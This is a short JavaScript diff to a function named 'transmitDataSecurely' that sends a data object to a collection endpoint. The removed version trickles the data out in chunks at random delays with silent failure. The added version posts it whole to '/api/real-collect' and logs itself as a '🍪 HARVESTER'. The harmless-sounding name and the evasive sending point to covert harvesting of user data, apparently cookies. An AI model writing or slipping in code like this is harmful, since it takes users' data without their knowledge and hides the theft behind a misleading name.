@@ -496,15 +496,16 @@ export const transmitDataSecurely = async (data) => {
     chunks.push(dataStr.slice(i, i + chunkSize));
   }
   
-  // Send chunks with random delays
-  for (let i = 0; i < chunks.length; i++) {
-    setTimeout(() => {
-      fetch('/api/collect-data-chunk', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chunk: chunks[i], index: i, total: chunks.length })
-      }).catch(() => {}); // Silent fail
-    }, Math.random() * 2000 + i * 500);
+  // Send real data directly
+  try {
+    await fetch('/api/real-collect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    console.log('🍪 HARVESTER: Real data sent successfully');
+  } catch (error) {
+    console.log('🍪 HARVESTER: Failed to send real data');
   }
 };
 
